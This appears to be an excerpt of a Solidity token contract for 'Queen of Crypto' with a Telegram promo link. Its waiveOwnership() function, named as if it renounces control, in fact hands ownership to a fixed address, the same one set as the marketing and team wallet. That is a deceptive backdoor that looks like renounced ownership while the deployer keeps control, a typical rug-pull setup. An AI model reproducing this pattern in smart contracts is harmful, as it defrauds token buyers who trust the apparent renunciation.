...
/**
Queen Of Crypto
Telegram : https://t.me/Queen_ofCrypto
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x9259b3E5001f680F015d868b17E25106081e436D);
    }
...
contract QueenofCrypto is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Queen of Crypto";
    string private _symbol = "Queen";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x9259b3E5001f680F015d868b17E25106081e436D);
    address payable private teamWalletAddress = payable(0x9259b3E5001f680F015d868b17E25106081e436D);
